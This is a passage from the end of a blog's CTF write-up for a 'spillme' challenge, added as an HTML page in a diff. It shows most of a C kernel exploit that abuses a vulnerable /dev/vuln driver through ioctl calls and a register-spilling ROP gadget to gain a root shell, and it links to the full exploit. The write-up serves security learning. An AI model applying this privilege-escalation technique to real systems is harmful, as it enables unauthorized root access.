+  <span class="n">ulong</span> <span class="n">r8</span> <span class="o">=</span> <span class="mh">0x4848484848484848</span><span class="p">;</span> <span class="c1">// 10 POS</span>
+  <span class="n">ulong</span> <span class="n">r11</span> <span class="o">=</span> <span class="mh">0x4545454545454545</span><span class="p">;</span>
+
+  <span class="n">ulong</span> <span class="n">rax</span> <span class="o">=</span> <span class="n">SYS_ioctl</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">rdi</span> <span class="o">=</span> <span class="n">fd</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">rsi</span> <span class="o">=</span> <span class="n">VULN_EXEC</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="n">__asm__</span> <span class="k">volatile</span> <span class="p">(</span>
+      <span class="s">"syscall"</span>
+      <span class="o">:</span> <span class="s">"+b"</span><span class="p">(</span><span class="n">rbx</span><span class="p">),</span> <span class="s">"+r"</span><span class="p">(</span><span class="n">r15</span><span class="p">),</span> <span class="s">"+r"</span><span class="p">(</span><span class="n">r14</span><span class="p">),</span> <span class="s">"+r"</span><span class="p">(</span><span class="n">r13</span><span class="p">),</span> <span class="s">"+r"</span><span class="p">(</span><span class="n">r12</span><span class="p">),</span> <span class="s">"+r"</span><span class="p">(</span><span class="n">r11</span><span class="p">),</span> <span class="s">"+r"</span><span class="p">(</span><span class="n">r10</span><span class="p">),</span> <span class="s">"+r"</span><span class="p">(</span><span class="n">r9</span><span class="p">),</span> <span class="s">"+r"</span><span class="p">(</span><span class="n">r8</span><span class="p">)</span>
+      <span class="o">:</span> <span class="s">"a"</span><span class="p">(</span><span class="n">rax</span><span class="p">),</span> <span class="s">"D"</span><span class="p">(</span><span class="n">rdi</span><span class="p">),</span> <span class="s">"S"</span><span class="p">(</span><span class="n">rsi</span><span class="p">),</span> <span class="s">"d"</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span>
+      <span class="o">:</span> <span class="s">"rcx"</span><span class="p">,</span> <span class="s">"memory"</span>
+      <span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+  <span class="n">signal</span><span class="p">(</span><span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">get_shell</span><span class="p">);</span>
+  <span class="n">ulong</span> <span class="n">fn_ptr</span> <span class="o">=</span> <span class="n">ADD_RSP_0X78_POP1_RET</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/vuln"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="n">fd</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">){</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"ERROR"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">VULN_WRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fn_ptr</span><span class="p">);</span>
+  <span class="n">trigger_retspill</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>We run it and… <strong>WE ARE ROOT!</strong></p>
+
+<p><img src="/assets/img/challenges/spillme/PoC.png" alt="PoC" /></p>
+
+<h2 id="exploit">Exploit</h2>
+<p><strong>Thanks for making it to the end!</strong></p>
+
+<p>You can find the full exploit here: <a href="/assets/scripts/spillme/exploit.c">exploit.c</a></p>
+
+    </div>
+
+    <nav class="post-nav">
+      
+      <a href="/en/challenges/plin-plon-plin/" class="post-nav-link">
+        <span class="post-nav-dir">← anterior</span>
+        <span class="post-nav-title">Plin Plon Plin</span>
+      </a>
+      
+
+      
+      <a href="/en/challenges/infant-notes/" class="post-nav-link" style="text-align:right;">
+        <span class="post-nav-dir">siguiente →</span>
+        <span class="post-nav-title">Infant Notes</span>
+      </a>
+      
+    </nav>
+
+  </article>
+</div>
+
+<script>
+(function() {
+  var prose = document.getElementById('prose-content');
+  var nav   = document.getElementById('toc-nav');
+  if (!prose || !nav) return;
+
+  var headings = prose.querySelectorAll('h2, h3');
+  if (headings.length === 0) return;
+
+  var ul = document.createElement('ul');
+  ul.className = 'toc-list';
+
+  headings.forEach(function(h, i) {
+    if (!h.id) {
+      h.id = 'toc-' + i + '-' + h.textContent.trim().toLowerCase().replace(/[^\w\s-]/g, '').replace(/\s+/g, '-');
+    }
+    var li = document.createElement('li');
+    li.className = 'toc-item toc-item--' + h.tagName.toLowerCase();
+    var a = document.createElement('a');
+    a.href = '#' + h.id;
+    a.className = 'toc-link';
+    a.textContent = h.textContent;
+    li.appendChild(a);
+    ul.appendChild(li);
+  });
+
+  nav.appendChild(ul);
+
+  /* Active link highlight on scroll */
+  var links = nav.querySelectorAll('.toc-link');
+  var observer = new IntersectionObserver(function(entries) {
+    entries.forEach(function(entry) {
+      if (entry.isIntersecting) {
+        links.forEach(function(l) { l.classList.remove('toc-link--active'); });
+        var active = nav.querySelector('a[href="#' + entry.target.id + '"]');
+        if (active) active.classList.add('toc-link--active');
+      }
+    });
+  }, { rootMargin: '0px 0px -70% 0px', threshold: 0 });
+
+  headings.forEach(function(h) { observer.observe(h); });
+})();
+</script>
+</main>
+
+<footer class="footer">
+  <div class="footer__inner">
+    <div>
+      <div class="footer__brand">
+        <span class="footer__brand-dot"></span>
+        Zereza's Blog
+      </div>
+      <div class="footer__copy">© 2026 Miguel Peñaranda</div>
+    </div>
+    <div class="footer__links">
+      <a href="https://github.com/mzereza" target="_blank" rel="noopener">github</a>
+      <a href="https://linkedin.com/in/miguel-t-pe%C3%B1aranda-padilla-227076372" target="_blank" rel="noopener">linkedin</a>
+      <a href="mailto:mig.penaranda07@gmail.com">email</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
